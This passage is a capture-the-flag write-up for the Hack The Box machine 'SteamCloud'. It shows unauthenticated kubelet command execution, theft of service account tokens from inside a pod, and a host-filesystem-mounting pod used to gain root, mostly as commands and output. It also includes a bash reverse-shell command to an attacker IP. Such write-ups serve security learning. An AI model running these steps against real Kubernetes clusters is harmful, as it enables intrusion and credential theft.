id="2c110f88-a442-4646-a921-d4b2c17884ce" class="">
+</p><p id="3ee15884-2edb-4c9b-8910-3389c4c8bf86" class="">Based on <a href="https://kubernetes.io/docs/reference/ports-and-protocols/">this documentation</a>, not only are 2379 and 2380 a part of Kubernetes, but the ports that <code>nmap</code> labeled as InfluxDB are as well. Based on some of the names, this seems like an instance of <a href="https://minikube.sigs.k8s.io/docs/">minikube</a>:</p><blockquote id="1077df70-22c7-4f5e-a8df-069ca446820d" class="">minikube quickly sets up a local Kubernetes cluster on macOS, Linux, and Windows. We proudly focus on helping application developers and new Kubernetes users.</blockquote><p id="f9001059-d147-4fe2-af26-42f689181310" class="">
+</p><hr id="c813e332-d6e3-4d82-92ca-b9f3dc4d4ffc"/><p id="fa4a6d3b-bf28-4aab-9606-dad350cdf5cb" class="">
+</p><h1 id="9174a939-af10-46ce-a6de-4155fb77575e" class="">2.Enumeration</h1><p id="5eb4b3df-9136-4f04-9ba7-e3612f977c42" class="">
+</p><p id="92d994a4-ebf3-4dd6-9a7b-f4c658a34132" class="">Lets have little overview of Kubernetes</p><p id="249db578-0f10-49ee-8d4a-b72963b7c607" class="">
+</p><p id="1fa35eed-ef12-4b57-a61c-1394d6d99c72" class=""> A short summary for kubernetes</p><p id="2bff2e16-8fa5-435d-bdca-8c06a88c4115" class=""><em>A portable, extensible, open-source platform for managing containerized workloads and services, that facilitates both declarative configuration and automation. It has a large, rapidly growing ecosystem. Kubernetes services, support, and tools are widely available.</em></p><p id="59f6c956-a764-4e98-b31e-912ee16c7420" class="">
+</p><figure id="c59ef119-7fa1-4276-b7a6-ffdeee2027c8" class="image"><a href="https://d33wubrfki0l68.cloudfront.net/2475489eaf20163ec0f54ddc1d92aa8d4c87c96b/e7c81/images/docs/components-of-kubernetes.svg"><img src="https://d33wubrfki0l68.cloudfront.net/2475489eaf20163ec0f54ddc1d92aa8d4c87c96b/e7c81/images/docs/components-of-kubernetes.svg"/></a></figure><p id="7cd411d2-8b9a-4f22-8d8f-740d62cbd57e" class="">
+</p><p id="d42cc824-dc84-46f5-bf9c-b288e657be9a" class="">Basic diagaram of Kubernetes cluster </p><p id="e37d4fd4-0f06-44d5-b5c2-6828bfd30dc2" class="">
+</p><p id="83985bdd-04a0-4b88-b69a-b7e525cc1f2b" class="">Typically these wouldn’t all be on the same host, but in an environment like HTB, it ends up that way.</p><p id="ebc7b427-8aa2-4df6-b4e2-48eaeae0ca9f" class="">So what we’re looking at on TCP 8443 is the main API server for the cluster. A kubelet is an agent running on each node that controls it, and typically listens on TCP 10250.</p><p id="b3812432-9a4a-4450-be77-9c3c3c598464" class="">
+</p><h3 id="5f54f708-1b1f-4364-b4b5-be9951d9553a" class="">Kubernetes API - TCP 8443</h3><p id="4994c449-02e7-4f06-b355-c989edbb09f5" class="">
+</p><p id="9d84a911-0e8d-4286-87f6-79506ceb8fe0" class="">TCP 8443 is the default starting port for the <a href="https://minikube.sigs.k8s.io/docs/commands/start/">API server in minikube</a>. Visiting the service in Firefox returns an HTTP 403 with a JSON body:</p><figure id="88e7c38a-667e-4bfb-95ad-2a2a45e408f6" class="image"><a href="Steam%20Clou%2088e7c/Untitled.png"><img style="width:1917px" src="Steam%20Clou%2088e7c/Untitled.png"/></a></figure><p id="e0c36174-2d3f-4603-81f3-5d10695d9946" class="">
+</p><p id="0ca9139a-89c7-4d9e-9b21-e7d793a70147" class="">The anonymous user can’t get ‘/ ‘ </p><p id="2ef67ac9-bb4d-4fb2-987c-a9b4f39a7875" class="">
+</p><p id="bc5d1f5b-3009-48dc-91df-129b4c6c20c0" class="">I can install a tool like <code>kubectl</code>  (instructions <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/">here</a>) and try to interact, but it just prompts for auth:</p><pre id="fcd72241-ecb4-4b9d-a223-369f48fdfb76" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ kubectl --server https://steamcloud.htb:8443 get pod                                                                                                                                                                                  1 ⨯
+Please enter Username: ^C
+                                                                                                                                                                                                                                              
+┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ kubectl --server https://steamcloud.htb:8443 get namespaces                                                                                                                                                                         130 ⨯
+Please enter Username: ^C
+                                                                                                                                                                                                                                              
+┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ kubectl --server https://steamcloud.htb:8443 get cluster-info                                                                                                                                                                       130 ⨯
+Please enter Username: ^C</code></pre><p id="cee51052-92af-4b6e-b3d9-ef48e21016c7" class="">
+</p><h3 id="08db82eb-bb35-4f30-9303-7cadab4e98e4" class="">Kubernetes API - TCP 10250</h3><p id="c712602e-a800-47f3-86f7-8829f13a53dd" class="">The kubelet agent listens on tcp 10250, so perhaps I can interact with a specific node . After using curl got this response</p><p id="e9b08b07-729d-4775-a380-b9c11f72ab88" class="">
+</p><pre id="e12c9955-55b8-48e1-a061-8413b7c75994" class="code"><code>──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ curl -k https://steamcloud.htb:10250                                                                                                                                                                                                 60 ⨯
+404 page not found</code></pre><p id="7177533c-a726-4a33-9447-74f66316ffb6" class="">
+</p><p id="0d460e63-8847-422a-914f-cfef20d37a2a" class="">There’s a tool like <code>kubectl</code> for kubelets, <a href="https://github.com/cyberark/kubeletctl">kubeletctl</a>. After installing it based on the instructions from the README, I’ll try the <code>pods</code> command to list all the pods on the node. There are a bunch:</p><pre id="5792399b-6975-4224-bcc8-80418fe67fe2" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$  /usr/local/bin/kubeletctl pods -s steamcloud.htb                                                                                                                                                                                     1 ⨯
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│                                Pods from Kubelet                                │
+├────┬────────────────────────────────────┬─────────────┬─────────────────────────┤
+│    │ POD                                │ NAMESPACE   │ CONTAINERS              │
+├────┼────────────────t────────────────────┼─────────────┼─────────────────────────┤
+│  1 │ etcd-steamcloud                    │ kube-system │ etcd                    │
+│    │                                    │             │                         │
+├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│  2 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
+│    │                                    │             │                         │
+├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│  3 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
+│    │                                    │             │                         │
+├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│  4 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
+│    │                                    │             │                         │
+├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│  5 │ storage-provisioner                │ kube-system │ storage-provisioner     │
+│    │                                    │             │                         │
+├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│  6 │ nginxt                             │ default     │ nginxt                  │
+│    │                                    │             │                         │
+├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│  7 │ kube-proxy-tgfjl                   │ kube-system │ kube-proxy              │
+│    │                                    │             │                         │
+├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│  8 │ coredns-78fcd69978-gtmpp           │ kube-system │ coredns                 │
+│    │                                    │             │                         │
+├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│  9 │ nginx                              │ default     │ nginx                   │
+│    │                                    │             │                         │
+├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 10 │ strange                            │ default     │ strange                 │
+│    │                                    │             │                         │
+└────┴────────────────────────────────────┴─────────────┴─────────────────────────┘</code></pre><p id="dd21cc6a-49c2-47c5-8762-95e6c8efa052" class="">got following reply</p><p id="73d72e09-9e3e-4375-b666-fc900d804aaa" class="">
+</p><p id="67e1cccb-d4dd-4fe3-8455-3725c2e3b8f6" class="">Lets try running pods</p><pre id="0b81b088-9366-418f-94bb-dca288b33625" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$  /usr/local/bin/kubeletctl runningpods -s steamcloud.htb                                                                                                                                                                              1 ⨯
+{
+  &quot;kind&quot;: &quot;PodList&quot;,
+  &quot;apiVersion&quot;: &quot;v1&quot;,
+  &quot;metadata&quot;: {},
+  &quot;items&quot;: [
+    {
+      &quot;metadata&quot;: {
+        &quot;name&quot;: &quot;coredns-78fcd69978-gtmpp&quot;,
+        &quot;namespace&quot;: &quot;kube-system&quot;,
+        &quot;uid&quot;: &quot;b1aea224-af72-4f58-a469-35f80bc7b7c3&quot;,
+        &quot;creationTimestamp&quot;: null
+      },
+      &quot;spec&quot;: {
+        &quot;containers&quot;: [
+          {
+            &quot;name&quot;: &quot;coredns&quot;,
+            &quot;image&quot;: &quot;sha256:8d147537fb7d1ac8895da4d55a5e53621949981e2e6460976dae812f83d84a44&quot;,
+            &quot;resources&quot;: {}
+          }
+        ]
+      },
+      &quot;status&quot;: {}
+    }, 
+    {
+      &quot;metadata&quot;: {
+        &quot;name&quot;: &quot;storage-provisioner&quot;,
+        &quot;namespace&quot;: &quot;kube-system&quot;,
+        &quot;uid&quot;: &quot;91953889-7dfb-4fb7-a758-d30ebb06c3fd&quot;,
+        &quot;creationTimestamp&quot;: null
+      },
+      &quot;spec&quot;: {
+        &quot;containers&quot;: [
+          {
+            &quot;name&quot;: &quot;storage-provisioner&quot;,
+            &quot;image&quot;: &quot;sha256:6e38f40d628db3002f5617342c8872c935de530d867d0f709a2fbda1a302a562&quot;,
+            &quot;resources&quot;: {}
+          }
+        ]
+      },
+      &quot;status&quot;: {}
+    }, 
+    {
+      &quot;metadata&quot;: {
+        &quot;name&quot;: &quot;kube-apiserver-steamcloud&quot;,
+        &quot;namespace&quot;: &quot;kube-system&quot;,
+        &quot;uid&quot;: &quot;c1926d0465cd9de10197b95a2c359105&quot;,
+        &quot;creationTimestamp&quot;: null
+      },
+      &quot;spec&quot;: {
+        &quot;containers&quot;: [
+          {
+            &quot;name&quot;: &quot;kube-apiserver&quot;,
+            &quot;image&quot;: &quot;sha256:53224b502ea4de7925ca5ed3d8a43dd4b500b2e8e4872bf9daea1fc3fec05edc&quot;,
+            &quot;resources&quot;: {}
+          }
+        ]</code></pre><p id="e4787bb9-76bf-4bfd-b676-615167a449fc" class="">got some json outputs , lets narrow down them using jq</p><pre id="133efc26-0b9e-43c1-8b5e-e899d587fd76" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$  /usr/local/bin/kubeletctl runningpods -s steamcloud.htb | jq -c &#x27;.items[].metadata | [.name, .namespace]&#x27;
+[&quot;kube-proxy-tgfjl&quot;,&quot;kube-system&quot;]
+[&quot;kube-scheduler-steamcloud&quot;,&quot;kube-system&quot;]
+[&quot;kube-controller-manager-steamcloud&quot;,&quot;kube-system&quot;]
+[&quot;strange&quot;,&quot;default&quot;]
+[&quot;nginx&quot;,&quot;default&quot;]
+[&quot;coredns-78fcd69978-gtmpp&quot;,&quot;kube-system&quot;]
+[&quot;storage-provisioner&quot;,&quot;kube-system&quot;]
+[&quot;nginxt&quot;,&quot;default&quot;]
+[&quot;kube-apiserver-steamcloud&quot;,&quot;kube-system&quot;]
+[&quot;etcd-steamcloud&quot;,&quot;kube-system&quot;]</code></pre><p id="76cf75fa-234d-4255-b1c0-f9a5c0985f06" class="">There’s only one that’s not in the <code>kube-system</code> namespace.</p><p id="355f9765-332a-43b7-94e8-54c5221149aa" class="">
+</p><hr id="dc90929b-dd5d-49cd-a4ba-46dbae9ab327"/><p id="86201a97-4925-476d-b897-c2dbbf2df0a0" class="">
+</p><h1 id="94d7de7f-b47a-4af3-87e5-c136f45cee0f" class="">3.Foothold</h1><p id="d8e2f870-59fb-4dca-86ec-31138999b4f1" class="">Trying to get access as root . </p><p id="a40d5518-c8f1-44b3-b98f-5ce589a83b02" class="">
+</p><p id="6b0d1d9a-f20a-4e6a-b3f0-9a7a4a31d76d" class="">With access to the kubelet service, I can also run commands on the containers. I’ll use the <code>exec</code>
+ command in <code>kubeletctl</code>, giving both the name of the pod (nginx) and the name of the container(nginx):</p><pre id="6c9ccc1f-8139-45ef-8560-af8caf6a12a6" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$  /usr/local/bin/kubeletctl -s steamcloud.htb exec &quot;id&quot; -p nginx -c nginx                                  
+uid=0(root) gid=0(root) groups=0(root)
+──(ezio㉿kali)-[~/htb/steamcloud]
+└─$  /usr/local/bin/kubeletctl -s steamcloud.htb exec &quot;cat /root/user.txt&quot; -p nginx -c nginx</code></pre><p id="8d669418-f6be-4c14-bc10-21fc4b48a253" class="">got user.txt but now time for root shell</p><p id="3cfbf340-2664-4a0b-9514-28af08084bd9" class="">
+</p><p id="00bccd0c-3766-435b-8fd1-490036bcfa17" class="">Lets try to get bash shell</p><pre id="ca567eaa-6745-4040-9f92-29abd49371ed" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$  /usr/local/bin/kubeletctl -s steamcloud.htb exec &quot;which bash&quot; -p nginx -c nginx
+/bin/bash</code></pre><p id="fe3be6a7-2683-4ffd-8b2d-8ce05961cf67" class="">system does have bash lets try to get that shell by using reverse shell</p><pre id="9ed57f67-4bd2-4458-b144-d84b3abe5faf" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ /usr/local/bin/kubeletctl -s steamcloud exec &quot;bash -c &#x27;bash -i &gt;&amp; dev/tcp/10.10.15.38/9999 0&gt;&amp;1&#x27;&quot; -p nginx -c nginx
+error sending request: Post &quot;https://steamcloud:10250/exec/default/nginx/nginx?command=bash&amp;command=-c&amp;command=&#x27;bash&amp;command=-i&amp;command=&gt;&amp;&amp;command=dev/tcp/10.10.15.38/9999&amp;command=0&gt;&amp;1&#x27;&amp;input=1&amp;output=1&amp;tty=1&quot;: dial tcp: lookup steamcloud on 192.168.0.1:53: no such host</code></pre><p id="77bad8ab-78ec-4e51-af7d-ec6cd6afb987" class="">Tried encoding the in base64 but no luck </p><p id="eb520ced-f019-4ccb-89a7-5a1daa16178b" class="">
+</p><hr id="868eeeca-fd93-4e84-9469-3850594a525e"/><p id="2c69ad3e-367b-41fa-acfd-377f19905cf8" class="">
+</p><h1 id="4cd54938-1614-42e8-a7d5-d7c94117a96e" class="">4.Privileage Escalation</h1><p id="4686968e-4ad3-4618-be31-a30f7ffffeb0" class="">
+</p><p id="f021960e-f727-40af-b8ed-5e8c290908cd" class="">Enumerating about nginx and kubernetes containners found a article on hacktricks</p><figure id="4c15d5b7-14dc-43bb-b938-3840fac219b1"><a href="https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Kubernetes Enumeration</div><div class="bookmark-description">API server is inside an internal network, therefore you will need to curl/wget/anything to perform raw HTTP requests to the API server. create a tunnel through the compromised machine to access it from your machine, or you can upload the</div></div><div class="bookmark-href"><img src="https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Favatar.png?generation=1572891120130012&amp;alt=media" class="icon bookmark-icon"/>https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration</div></div><img src="https://app.gitbook.com/share/space/thumbnail/-L_2uGJGU7AVNRcqRvEi.png?color=%230000FF&amp;logo=https%3A%2F%2Ffirebasestorage.googleapis.com%2Fv0%2Fb%2Fgitbook-28427.appspot.com%2Fo%2Fspaces%252F-L_2uGJGU7AVNRcqRvEi%252Favatar.png%3Fgeneration%3D1572891120130012%26alt%3Dmedia&amp;theme=none" class="bookmark-image"/></a></figure><p id="b06abd80-1e02-4d94-96a0-fd256f4c9ba5" class="">location of the ServiceAccount object, which is managed by Kubernets and provides identity within the pod. It gives three typical directories:</p><ul id="db2dd49b-6d66-4d1d-b452-844cd6ced09c" class="bulleted-list"><li style="list-style-type:disc"><code>/run/secrets/kubernetes.io/serviceaccount</code></li></ul><ul id="84de1764-5fbb-4594-80e0-b9a8ebac3d0f" class="bulleted-list"><li style="list-style-type:disc"><code>/var/run/secrets/kubernetes.io/serviceaccount</code></li></ul><ul id="c8585d43-eb69-4680-b72c-8af6fa0b52a2" class="bulleted-list"><li style="list-style-type:disc"><code>/secrets/kubernetes.io/serviceaccout</code></li></ul><p id="4f241967-7d25-4af8-a1d3-607be0cb31eb" class="">lets try out </p><pre id="a18f8483-827c-41ab-8b10-c47f63053e26" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ /usr/local/bin/kubeletctl -s steamcloud.htb exec &quot;ls /run/secrets/kubernetes.io/serviceaccount&quot; -p nginx -c nginx
+ca.crt	namespace  token</code></pre><p id="9f71e597-cf84-485a-b4ba-fb6ab2338971" class="">Found a three expected files according to article on hacktricks</p><ul id="ea21a68f-e69c-4b00-8b8a-659f5ad0a3d2" class="bulleted-list"><li style="list-style-type:disc"><strong>ca.crt</strong>: It&#x27;s the ca certificate to check kubernetes communications</li></ul><ul id="464752b9-6164-48f5-a082-e5b622119430" class="bulleted-list"><li style="list-style-type:disc"><strong>namespace</strong>: It indicates the current namespace</li></ul><ul id="ecc573a5-5c28-461c-a42c-ec439c3edd6a" class="bulleted-list"><li style="list-style-type:disc"><strong>token</strong>: It contains the <strong>service token</strong> of the current pod.</li></ul><p id="7aeaaca6-7fa2-4350-910a-1df943f29a02" class="">with <span style="border-bottom:0.05em solid"><strong>ca.crt </strong></span> and  <span style="border-bottom:0.05em solid"><strong>token </strong></span><strong>  can authenticate to cluster</strong></p><pre id="c8f6860d-6355-4c0a-a4be-80a137d257a2" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ /usr/local/bin/kubeletctl -s steamcloud.htb exec &quot;cat /run/secrets/kubernetes.io/serviceaccount/ca.crt&quot; -p nginx -c nginx | tee ca.crt
+-----BEGIN CERTIFICATE-----
+MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
+a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
+AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
+YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
+HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
+deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
+VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
+
+──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ /usr/local/bin/kubeletctl -s steamcloud.htb exec &quot;cat /run/secrets/kubernetes.io/serviceaccount/token&quot; -p nginx -c nginx | tee token  
+eyJhbGciOiJSUzI1NiIsImtpZCI6IkRZczEtSW52eHpIVXpfbVBYOFZkcjJTZmxlYl9aZHFnNHpnQ2dqSDZ5dXcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3MjY3OTMxLCJpYXQiOjE2NDU3MzE5MzEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjhkODdmNTVjLWQ3ZTAtNDZjNi04MWQ1LTNlYTI4NTI5NDUyYiJ9LCJzZXJ2a</code></pre><p id="43f924c9-b075-4914-a0c8-d1217e6629b2" class="">save file using tee</p><p id="9b042e2f-3ccf-4e37-8d3a-cd084edb1ca7" class="">
+</p><p id="c8e73c66-02f4-4ab0-a77f-099cf361513c" class="">lets authenticate kubernetes API , but first lets export token in variable to save copy &amp; paste work</p><pre id="eaab092b-cdb0-4fda-99a2-ab2d714f122a" class="code"><code>──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ export token=$(/usr/local/bin/kubeletctl -s steamcloud.htb exec &quot;cat /run/secrets/kubernetes.io/serviceaccount/token&quot; -p nginx -c nginx)</code></pre><p id="9b10093e-1874-476d-a07a-14bd0c9e8d4f" class="">Now I can pass the <code>ca.crt</code> file and the <code>token</code> to <code>kubectl</code> and it doesn’t ask for a username and password:</p><pre id="36423643-0d64-491c-bf29-8d589bb505c1" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod                                                                                                                                      1 ⨯
+
+NAME      READY   STATUS                 RESTARTS   AGE
+nginx     1/1     Running                0          10h
+nginxt    0/1     CreateContainerError   0          7h18m
+strange   1/1     Running                0          7h33m</code></pre><p id="1142927a-c603-4e8a-96a9-29c3638cc6de" class="">The current account can’t do some of the more admin-like things like get information about the namespaces or cluster:</p><pre id="53c72fa5-08f2-442b-a8c9-326ea741561d" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get namespaces
+Error from server (Forbidden): namespaces is forbidden: User &quot;system:serviceaccount:default:default&quot; cannot list resource &quot;namespaces&quot; in API group &quot;&quot; at the cluster scope
+┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token cluster-info                                                                                                                                 1 ⨯
+
+To further debug and diagnose cluster problems, use &#x27;kubectl cluster-info dump&#x27;.
+Error from server (Forbidden): services is forbidden: User &quot;system:serviceaccount:default:default&quot; cannot list resource &quot;services&quot; in API group &quot;&quot; in the namespace &quot;kube-system&quot;</code></pre><p id="fe25e9fb-182d-493b-b77a-9e7ebfb77edf" class="">The <code>auth can-i</code> command in <code>kubectl</code> is used to see if a given account can take some action. With the <code>-list</code> flag, it will show all permissions:</p><pre id="39fd43a2-4794-4e32-a069-7759b791360d" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ kubectl auth can-i --list --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token                                                                                                                            1 ⨯
+Resources                                       Non-Resource URLs                     Resource Names   Verbs
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+pods                                            []                                    []               [get create list]
+                                                [/.well-known/openid-configuration]   []               [get]
+                                                [/api/*]                              []               [get]
+                                                [/api]                                []               [get]
+                                                [/apis/*]                             []               [get]
+                                                [/apis]                               []               [get]
+                                                [/healthz]                            []               [get]</code></pre><p id="9709cb38-6a19-45bd-8b84-4165d0224bb8" class="">The important line is the third one, which says this account can <code>get</code>, <code>create</code>, and <code>list</code> pods</p><p id="53c1b167-a02c-4ee1-87af-0fecdbb3f6e1" class="">
+</p><p id="3aa71851-30f8-4a26-ae97-84b37f4c5fc3" class="">grabbing details of nginx containner</p><pre id="b932da75-51eb-4cf6-9bdc-8f95e599675e" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ kubectl get pod nginx -o yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token                                                                                                                        1 ⨯
+apiVersion: v1
+kind: Pod
+metadata:
+  annotations:
+    kubectl.kubernetes.io/last-applied-configuration: |
+      {&quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,&quot;metadata&quot;:{&quot;annotations&quot;:{},&quot;name&quot;:&quot;nginx&quot;,&quot;namespace&quot;:&quot;default&quot;},&quot;spec&quot;:{&quot;containers&quot;:[{&quot;image&quot;:&quot;nginx:1.14.2&quot;,&quot;imagePullPolicy&quot;:&quot;Never&quot;,&quot;name&quot;:&quot;nginx&quot;,&quot;volumeMounts&quot;:[{&quot;mountPath&quot;:&quot;/root&quot;,&quot;name&quot;:&quot;flag&quot;}]}],&quot;volumes&quot;:[{&quot;hostPath&quot;:{&quot;path&quot;:&quot;/opt/flag&quot;},&quot;name&quot;:&quot;flag&quot;}]}}
+  creationTimestamp: &quot;2022-02-24T10:01:02Z&quot;
+  name: nginx
+  namespace: default
+  resourceVersion: &quot;505&quot;
+  uid: 8d87f55c-d7e0-46c6-81d5-3ea28529452b
+spec:
+  containers:
+  - image: nginx:1.14.2
+    imagePullPolicy: Never
+    name: nginx
+    resources: {}
+    terminationMessagePath: /dev/termination-log
+    terminationMessagePolicy: File
+   </code></pre><p id="d9a27c80-4dde-496b-ada8-b13b8aa9e243" class="">There’s a ton of information here, but the two key parts I need:</p><ul id="5c01d81e-1814-4f72-8e7e-a3b9db9d49e5" class="bulleted-list"><li style="list-style-type:disc"><code>namespace</code> is <code>default</code></li></ul><ul id="02815254-077b-4f4e-87df-a6bc8be86f63" class="bulleted-list"><li style="list-style-type:disc"><code>image</code> is <code>nginx:1.14.2</code></li></ul><p id="6b308188-1d36-4d92-bd4f-22121d97ca3b" class="">
+</p><p id="71699707-6f35-41c2-b94e-df8094df80ff" class="">Stragety to get root ,the trick here is to create a pod (container) that has the root file system mapped into it. Then I can execute in the pod, and access the mapped volume, which is the full file system of the host.</p><p id="d765f217-8941-4b68-bce8-4216900e1bea" class="">
+</p><p id="778e96c1-4624-42f4-ab73-3c9d1d2d01cc" class="">Pod descripiton</p><pre id="312493f1-9459-475e-bbee-5992b636702d" class="code"><code>apiVersion: v1 
+kind: Pod
+metadata:
+  name: 0xdf-pod
+  namespace: default
+spec:
+  containers:
+  - name: 0xdf-pod
+    image: nginx:1.14.2
+    volumeMounts: 
+    - mountPath: /mnt
+      name: hostfs
+  volumes:
+  - name: hostfs
+    hostPath:  
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true</code></pre><p id="8738482f-1329-4dde-901e-f373fb166e86" class="">The <code>name</code> is arbitrary. The <code>namespace</code> is the one I’ve been working out of, <code>default</code>. I’ll use the image that already exists here, <code>nginx:1.14.2</code>. The rest is just setting up the <code>volumes</code> / <code>volumeMounts</code>. The <code>volumeMount</code> says that I’m going to mount a <code>volume</code> named <code>hostfs</code> into the container at the mount point <code>/mnt</code>. Then that volume is defined as <code>/</code> on the host file system.</p><p id="2c81d290-8805-4ef2-b17b-a08b1abbab27" class="">
+</p><p id="e7a36fcc-25f5-45ba-a0af-f870fbdf44b8" class="">Now , Executing pod</p><pre id="8ec77af6-9e82-4784-9cc8-0f6813f3ae14" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ kubectl apply -f evil-pod.yaml --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token    
+pod/0xdf-pod created
+                                                                                                                                                                                                                                              
+┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ kubectl get pod  --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token  
+NAME       READY   STATUS                 RESTARTS   AGE
+0xdf-pod   1/1     Running                0          14s
+nginx      1/1     Running                0          10h
+nginxt     0/1     CreateContainerError   0          7h31m
+strange    1/1     Running                0          7h45m</code></pre><p id="a3d71225-faf3-40e8-9df8-9964f446e2f8" class="">
+</p><p id="e27b820c-9e25-4cae-8c7b-629fda9e09ac" class="">kubeletctl also shows the our pod</p><pre id="9b04d09b-56b7-4937-80a1-5a90d6dbb3b9" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ /usr/local/bin/kubeletctl pods -s steamcloud.htb
+┌─────────────────────────────────────────────────────────────────────────────────┐
+│                                Pods from Kubelet                                │
+├────┬────────────────────────────────────┬─────────────┬─────────────────────────┤
+│    │ POD                                │ NAMESPACE   │ CONTAINERS              │
+├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│  1 │ storage-provisioner                │ kube-system │ storage-provisioner     │
+│    │                                    │             │                         │
+├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│  2 │ nginxt                             │ default     │ nginxt                  │
+│    │                                    │             │                         │
+├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│  3 │ 0xdf-pod                           │ default     │ 0xdf-pod                │
+│    │                                    │             │                         │</code></pre><p id="0f12f31a-ffc2-4075-81a4-3a035db2002b" class="">
+</p><p id="cc4c6dd4-5567-41a1-8220-aa39946ccb31" class="">Now time for execution</p><pre id="abe4f1ef-5438-4912-aef9-87d62698ffd1" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ /usr/local/bin/kubeletctl exec &quot;id&quot; -s steamcloud.htb -p 0xdf-pod -c 0xdf-pod
+uid=0(root) gid=0(root) groups=0(root)</code></pre><p id="58464b07-13bd-42c0-b54d-0f8995a23b2c" class="">But this time the host file system is mounted at <code>/mnt</code> and can read root flag:</p><pre id="adbb6d4b-ee1d-4ac3-84c0-68c64511acce" class="code"><code>┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ /usr/local/bin/kubeletctl exec &quot;ls /mnt&quot; -s steamcloud.htb -p 0xdf-pod -c 0xdf-pod
+bin   home	      lib32	  media  root  sys  vmlinuz
+boot  initrd.img      lib64	  mnt	 run   tmp  vmlinuz.old
+dev   initrd.img.old  libx32	  opt	 sbin  usr
+etc   lib	      lost+found  proc	 srv   var
+                                                                                                                                                                                                                                              
+┌──(ezio㉿kali)-[~/htb/steamcloud]
+└─$ /usr/local/bin/kubeletctl exec &quot;cat /mnt/root/root.txt&quot; -s steamcloud.htb -p 0xdf-pod -c 0xdf-pod</code></pre><p id="21d6b5c3-493c-4118-85cb-30bfabbd1928" class="">
